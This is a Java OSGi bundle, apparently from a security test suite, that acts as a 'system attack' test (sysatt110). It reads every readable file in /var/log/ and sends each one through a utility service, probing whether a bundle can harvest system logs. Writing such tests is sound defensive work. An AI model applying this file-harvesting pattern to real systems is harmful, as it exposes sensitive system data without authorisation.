package org.osgi.security.sysatt110.test;

import org.osgi.framework.BundleContext;
import org.junit.Assert;
import org.junit.Test;
import org.osgi.framework.BundleActivator;
import org.osgi.framework.Constants;
import org.osgi.framework.ServiceEvent;
import org.osgi.framework.ServiceListener;
import org.osgi.framework.ServiceReference;

import org.osgi.security.util.api.Util;

import java.io.File;

/**
 * 
 */

public class Activator implements BundleActivator
{
	private static BundleContext bundleContext;
	private static ServiceReference<?> service;
    private Util util;
    private boolean succeed = false;

	static BundleContext getContext()
    {
		return bundleContext;
    }
	
	static ServiceReference<?> getService()
    {
		return service;
    }

	public void start(BundleContext context) throws Exception
  	{
  		Activator.bundleContext = context;
    }
  	
  	public void stop(BundleContext context) throws Exception
  	{
  		Activator.bundleContext = null;
  		util.stop(succeed);
    }
  	
  	@Test
    public void testSysatt110() throws Exception
    {
  		service = getContext().getServiceReference(Util.class.getName());
    	if (service != null)
    	{
    		listFiles();
    	}
    	else
    	{
        	ServiceListener listener = new ServiceListener()
        	{
        		public void serviceChanged(ServiceEvent e)
        		{
        			service = e.getServiceReference();
        			switch (e.getType())
        			{
    	            	case ServiceEvent.REGISTERED:
    	            		try {
    	            			listFiles();
    	            		} catch (Exception e1) {
    	            			util.err(e1);
    	            		}       	
							break;
							
    	             	default:
    	            		// Nothing
    	            		break;
        			}
    	        }
    	    };
    	    String filter = "(" + Constants.OBJECTCLASS + "=" + Util.class.getName() + ")";
    	    getContext().addServiceListener(listener, filter);
    	}
  		Assert.assertTrue("Test passed", succeed);
    }
  	
  	public void listFiles() throws Exception
  	{
  		util = (Util) getContext().getService(getService());
		util.start("sysatt110","Récupération de fichiers de logs","Récupération des fichiers pertinents de log système");
	    try
	    {
	    	util.sendCmd("sysatt110");
	    	File dir = new File("/var/log/");
	        File list[] ;
	        list = dir.listFiles();
	        Assert.assertNotNull("No access to /var/log/ directory", list);
	        for (int i=0; i<list.length; i++)
	        {
	        	if (list[i].isFile()&&list[i].canRead())
	        	{
	        		util.sendFile(list[i]);
	        	}
	        }
    	    succeed = true;
	        util.sendCmd("::done::");
	    }
	    catch (Exception e)
	    {
	        util.err(e);
	    }
	    stop(getContext());
  	}
}